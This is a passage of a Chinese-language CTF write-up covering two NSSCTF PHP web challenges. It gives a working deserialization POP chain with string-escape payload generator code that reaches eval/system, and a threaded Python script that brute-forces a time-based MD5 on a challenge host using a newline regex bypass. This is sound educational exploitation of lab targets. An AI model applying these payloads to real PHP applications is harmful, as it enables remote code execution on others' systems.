class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pdata</span>=<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pdata</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>一道反序列化链题目<br>首先要找到反序列化链，我们最终要执行的是youwant类中的eval函数，就要执行rce这个方法<br>rce这个方法在output类中的__toString()方法调用，__toString()要怎么调用呢<br>在nothing类中有die函数，这个函数执行的时候就回调用__toString()。<br>但是nothing类中有wakeup魔法函数，他会重置，我们想要绕过，但是之前常用的方法在这里不能用<br>原因是__wakeup () 绕过漏洞存在的版本需要满足  PHP5 &lt; 5.6.25     PHP7 &lt; 7.0.10<br>但是这里给了我们一个解决方法，__destruct()中除了die函数，还有一个<code>$this-&gt;b=$this-&gt;t;</code><br>既然a会被重置，但是这里b又会被赋值，那只要把a和b的地址公用就可以了，这样b被修改的时候，a也会被修改<br>pop链： youwant:rce() -&gt; output:tostring() -&gt; nothing:__destruct()</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">youwant</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; cmd = <span class="string">&#x27;system(&quot;ls&quot;)&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">output</span>();</span><br><span class="line"><span class="variable">$b</span> -&gt; a = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">nothing</span>();</span><br><span class="line"><span class="variable">$c</span> -&gt; a = &amp;<span class="variable">$c</span> -&gt; b;</span><br><span class="line"><span class="variable">$c</span> -&gt; t = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"> O:<span class="number">7</span>:<span class="string">&quot;nothing&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;R:<span class="number">2</span>;s:<span class="number">1</span>:<span class="string">&quot;t&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;output&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;youwant&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;system(&quot;</span>ls<span class="string">&quot;);&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
<p>上面的结果是不考虑后面的代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pdata</span>=<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pdata</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>我们上面构造的序列化的是nothing类，但是这里序列化的是UUCTF类，所以要进行<code>反序列化字符逃逸</code><br>因为UUCTF这个类明显是无法达到我们的目的的。<br>但是在这个类中</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($<span class="keyword">this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;ob=unserialize(base64_decode($<span class="keyword">this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<p>这里也有反序列化操作，所以如果让这里的basedata为我们上面构造的base64编码<br>然后这个是在wakeup中，在最后代码中的<code>unserialize($data_replace);</code>中反序列化后wakeup就会执行。<br>所以我们可以构造</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key=<span class="string">&quot;UUCTF&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;basedata = <span class="string">&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"> O:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;basedata&quot;</span>;s:<span class="number">164</span>:<span class="string">&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0=&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ob&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个结果才是我们想要的，但是在最后的代码中<code>$data=serialize(new UUCTF($pdata));</code><br>这里的<code>$pdata</code>控制的是name，但是为了能够调用eval函数，就必须让basedata是我们上面构造的序列化字符，UUCTF类的key也必须是”UUCTF”，所以我们要进行字符逃逸。<br>字符串逃逸又是什么呢？<br>在最后的代码中实行<code>$data_replace=str_replace(&quot;hacker&quot;,&quot;loveuu!&quot;,$data);</code>每次会把hacker 替换成loveuu!  6个字符替换成了7个字符，但是序列化字符串格式前面的个数是没变的，替换就会长度不匹配导致反序列化操作失败<br>题目中的序列化字符串的基本形式是<br>O:5:”UUCTF”:4:{s:4:”name”;s:3:”abc”;s:3:”key”;N;s:8:”basedata”;N;s:2:”ob”;N;}<br>我们能控制的只有name<br>上面我们构造的第二个序列化结果中name后面的是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">&quot;;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;basedata&quot;</span>;s:<span class="number">164</span>:<span class="string">&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0=&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ob&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>
<p>比如一共是262个字符（后面用strlen计算），因为我们每有一个hacker就会让替换后的字符多1，所以我们构造262个hacker<br><code>262+6*262=7*262=1834 </code><br>还记得我们最开始构造UUCTF类的结果吗，现在我们拆成3个部分</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#第一部分</span></span><br><span class="line">O<span class="punctuation">:</span><span class="number">5</span><span class="punctuation">:</span><span class="string">&quot;UUCTF&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">:</span>&#123;s<span class="punctuation">:</span><span class="number">4</span><span class="punctuation">:</span><span class="string">&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#第二部分</span></span><br><span class="line">name</span><br><span class="line"></span><br><span class="line"><span class="meta">#第三部分</span></span><br><span class="line"><span class="string">&quot;;s:3:&quot;</span>key<span class="string">&quot;;s:5:&quot;</span>UUCTF<span class="string">&quot;;s:8:&quot;</span>basedata<span class="string">&quot;;s:164:&quot;</span>Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0<span class="punctuation">=</span><span class="string">&quot;;s:2:&quot;</span>ob<span class="string">&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>
<p>我这么拆分的意义也很明显了，就是让name变成替换的loveuu!<br>替换之后就是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1834</span>:<span class="string">&quot;262 个 loveuu!&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;basedata&quot;</span>;s:<span class="number">164</span>:<span class="string">&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0=&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ob&quot;</span>;N;&#125; s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;basedata&quot;</span>;N;s:<span class="number">2</span>:<span class="string">&quot;ob&quot;</span>;N;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>反序列化函数看到<code>；&#125; </code>就当作结束符号，后面的都会忽略掉<br>完整的代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    public <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    public <span class="variable">$a</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    public <span class="variable">$a</span>;  </span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">    public <span class="variable">$t</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    public <span class="variable">$cmd</span>; </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = new youwant();</span><br><span class="line"><span class="variable">$a</span>-&gt;cmd = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = new output();</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> = new nothing();</span><br><span class="line"><span class="variable">$c</span>-&gt;a = &amp;<span class="variable">$c</span>-&gt;b;</span><br><span class="line"><span class="variable">$c</span>-&gt;t = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$basedata</span> = base64_encode(serialize(<span class="variable">$c</span>));</span><br><span class="line"> </span><br><span class="line"><span class="variable">$post</span>=<span class="string">&#x27;&quot;;s:3:&quot;key&quot;;s:5:&quot;UUCTF&quot;;s:2:&quot;ob&quot;;N;s:8:&quot;basedata&quot;;s:&#x27;</span>.strlen(<span class="variable">$basedata</span>).<span class="string">&#x27;:&quot;&#x27;</span>.<span class="variable">$basedata</span>.<span class="string">&#x27;&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$hacker</span>=<span class="variable">$hacker</span>.<span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">echo <span class="variable">$hacker</span>.<span class="variable">$post</span>;</span><br></pre></td></tr></table></figure></div>
<p>然后用post发送data数据<br><img src="https://pic1.imgdb.cn/item/67b49075d0e0a243d400916a.png"><br>那只要把前面的ls 指令改成cat flag命令就可以得到flag 但是这里要用tac 不知道为什么<br>参考： <a href="https://blog.csdn.net/weixin_73904941/article/details/143440458">[UUCTF 2022 新生赛] ezpop 详细题解 (字符串逃逸)</a><br>这道题出的还是很好的，就是反序列化链和字符串逃逸，我也是第一次做字符串逃逸，这道题还是挺适合入门的，值得研究</p>
<h1 id="funmd5"><a href="#funmd5" class="headerlink" title="funmd5"></a>funmd5</h1><p>题目：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$time</span>=<span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="variable">$guessmd5</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$time</span>);</span><br><span class="line"><span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&quot;md5&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$md5</span>))&#123;</span><br><span class="line">    <span class="variable">$sub</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$time</span>,-<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$md5</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^(.*)0e(.*)$/&#x27;</span>,<span class="string">&#x27;$&#123;1&#125;no_science_notation!$&#123;2&#125;&#x27;</span>,<span class="variable">$md5</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/0e/&#x27;</span>,<span class="variable">$md5</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$md5</span>[<span class="number">0</span>]=<span class="title function_ invoke__">substr</span>(<span class="variable">$md5</span>[<span class="number">0</span>],<span class="variable">$sub</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$md5</span>[<span class="number">0</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>[<span class="number">0</span>])&amp;&amp;<span class="variable">$md5</span>[<span class="number">1</span>]===<span class="variable">$guessmd5</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;well!you win again!now flag is yours.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$md5</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;oh!no!maybe you need learn more PHP!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is your md5:<span class="subst">$md5</span>[0]&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;maybe you need more think think!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$sub</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$md5</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$guessmd5</span>,<span class="number">0</span>,<span class="number">5</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;plase give me the md5!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">4</span>a175</span><br><span class="line">plase give me the md5!</span><br></pre></td></tr></table></figure></div>
<p>这里的正则是过滤了科学计数法。如果 md5 以 0e 形式出现，则替换 0e 为 no_science_notation!<br>$sub 取 $time 的最后一位数字。<br>然后判断 <code>$md5[0]</code> 是否包含 0e，如果是，则进入处理逻辑。<br><code>$md5[0]</code> 截取 $sub 位置后的字符串。<br><code> if($md5[0]==md5($md5[0])&amp;&amp;$md5[1]===$guessmd5)&#123;</code> 前面一个是弱比较 后面一个是严格比较</p>
<p>所以我们的md5要满足两个条件<br><code>md5[0] == md5(md5[0])</code><br>    需要找到一个 MD5 碰撞值，满足 <code>md5($input)</code> 生成 0e 形式的哈希值，使 <code>md5($input)</code> &#x3D;&#x3D; $input 成立。<br><code>md5[1] === $guessmd5</code><br>    <code>$md5[1]</code>需要等于 <code>md5($time)</code>。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$sub</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$md5</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$guessmd5</span>,<span class="number">0</span>,<span class="number">5</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;plase give me the md5!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">4</span>a175</span><br><span class="line">plase give me the md5!</span><br></pre></td></tr></table></figure></div>
<p>这部分给出了<code>$guessmd5</code>的前5位是<code>4a175</code></p>
<p>现在一步步分析， 如果要满足<code>$md5[0]==md5($md5[0])</code> 可以选择<code>0e215962017</code>,但是刚才说有一个0e的替换<br>现在分析如果绕过<code>$md5=preg_replace(&#39;/^(.*)0e(.*)$/&#39;,&#39;$&#123;1&#125;no_science_notation!$&#123;2&#125;&#39;,$md5);</code><br>先理解这个正则的替换规则</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">在 Python 正则表达式中，<span class="string">&quot;.&quot;</span> 表示匹配除了换行符之外的任意单个字符，<span class="string">&quot;*&quot;</span> 表示匹配前面的字符零次或多次。因此，<span class="string">&quot;.*&quot;</span> 表示匹配任意长度的字符序列，这也被称为贪婪匹配 <span class="punctuation">(</span>greedy matching<span class="punctuation">)</span>。</span><br></pre></td></tr></table></figure>
<p>所以注意到这个除了换行符以外，如果在0e之前是一个换行符，那这个正则就匹配不到了，所以用<code>%0a0e215962017</code><br>然后<code>$md5[0]=substr($md5[0],$sub);</code>这里会对我们的输入截取，所以让<code>$sub</code>&#x3D; 1 就可以绕过<br>最后一个满足的条件是<code>$md5[1]===$guessmd5</code>  那就可以用脚本发送请求包，然后让md5碰撞相等</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> concurrent.futures  //多线程</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://node5.anna.nssctf.cn:24604/?md5[0]=%0a0e215962017&amp;md5[1]=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_md5</span>(<span class="params">t</span>):</span><br><span class="line">    md5_value = hashlib.md5(<span class="built_in">str</span>(t).encode()).hexdigest()</span><br><span class="line">    url = URL.<span class="built_in">format</span>(md5_value)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.get(url, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;win&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Success! Time: <span class="subst">&#123;t&#125;</span>, MD5: <span class="subst">&#123;md5_value&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_md5</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        current_time = <span class="built_in">int</span>(time.time())</span><br><span class="line">        times_to_try = [current_time, current_time - <span class="number">1</span>, current_time + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">3</span>) <span class="keyword">as</span> executor:</span><br><span class="line">            results = executor.<span class="built_in">map</span>(check_md5, times_to_try)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(results):</span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 如果成功，停止爆破</span></span><br><span class="line"></span><br><span class="line">guess_md5()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Success! Time: <span class="number">1740057131</span>, MD5: a98e4d04c331353cd0f2e59ade3a687c</span><br><span class="line">well!you win again!now flag <span class="keyword">is</span> yours.&lt;br&gt;NSSCTF&#123;d6652175-9bbd-<span class="number">4810</span>-9c85-2c73685557c3&#125;</span><br><span class="line">(base) kakeru@bogon python % python -u <span class="string">&quot;/Users/kakeru/python/web/funmd5.py&quot;</span></span><br><span class="line">/Users/kakeru/Library/Python/<span class="number">3.9</span>/lib/python/site-packages/urllib3/__init__.py:<span class="number">35</span>: NotOpenSSLWarning: urllib3 v2 only supports OpenSSL <span class="number">1.1</span><span class="number">.1</span>+, currently the <span class="string">&#x27;ssl&#x27;</span> module <span class="keyword">is</span> compiled <span class="keyword">with</span> <span class="string">&#x27;LibreSSL 2.8.3&#x27;</span>. See: https://github.com/urllib3/urllib3/issues/<span class="number">3020</span></span><br><span class="line">  warnings.warn(</span><br><span class="line">Success! Time: <span class="number">1740057131</span>, MD5: a98e4d04c331353cd0f2e59ade3a687c</span><br><span class="line">well!you win again!now flag <span class="keyword">is</span> yours.&lt;br&gt;NSSCTF&#123;d6652175-9bbd-<span class="number">4810</span>-9c85-2c73685557c3&#125;</span><br></pre></td></tr></table></figure></div>

